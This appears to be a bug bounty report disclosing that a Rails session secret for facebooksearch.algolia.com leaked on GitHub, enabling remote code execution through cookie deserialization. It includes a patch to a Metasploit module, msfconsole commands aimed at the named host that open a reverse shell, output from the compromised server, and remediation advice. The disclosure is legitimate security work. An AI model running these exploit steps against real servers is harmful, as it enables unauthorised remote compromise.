## Vulnerability Information
While doing recon on Algolia, I found that the session secret for facebooksearch.algolia.com has been committed to a **public** GitHub repository. Since the Rails app running at `facebooksearch.algolia.com` is using `CookieStore` as the session storage, this means an attacker knowing the session secret can craft any cookie that will then be accepted by the server.

Cookie values are deserialized (unmarshalled) server-side. That combined with knowing the session secret creates the dangerous opportunity for an RCE. The attacker can sign a cookie that contains a Ruby object that evals arbitrary code when it is deserialized on the server side. The concept is explained in depth here: https://charlie.bz/blog/rails-3.2.10-remote-code-execution. 

# Where did I find the session secret?
I used [Gitrob](https://github.com/michenriksen/gitrob) to scan all of Algolia's public repositories (plus repositories from employees) and extract everything that is interesting. The `secret_token.rb` initializer immediately caught my attention since it usually contains the `secret_key_base`, which should never be public. 

The token can be found here: https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12

# Proof of Concept
@joernchen developed a ready to go proof of concept for this vulnerability and submitted it to the [Metasploit Framework](http://www.darkoperator.com/installing-metasploit-in-ubunt/): https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb

Since the version of the exploit doesn't take cookies with `-` into account, here is a small patch to allow the exploit to work on the `_facebook-search_session` cookie. Here's the patch for the exploit: 

```diff
     if res && !res.get_cookies.empty?
-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)
+      match = res.get_cookies.match(/([_A-Za-z0-9\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)
     end
```

With that patch applied, you can run the PoC from `msfconsole` by following these commands:

```bash
# setting up
use exploit/multi/http/rails_secret_deserialization
set secret "<grab-from-github-url>"
set rhost facebooksearch.algolia.com
set railsversion 4
set targeturi /auth/facebook

# and then run
exploit

# when successful, a reverse shell will be established
# this allows you to run arbitrary commands
```

As a proof of concept, I ran `id`:

```
id
uid=1000(prod) gid=1000(prod) groups=1000(prod)
```

But since that is very generic, I also created http://facebooksearch.algolia.com/hackerone.txt with the text "PoC by michiel" to proof regular write access is possible as well. 

# Remediation
Switch `config/initializers/secret_token.rb` to use an environment variable (e.g. `ENV['SECRET_KEY_BASE']`). You must also generate a new token because the current secret is compromised. A new secret can be generated by running `rake secret` from the command line. Make sure the new secret does not leak in git commit history.
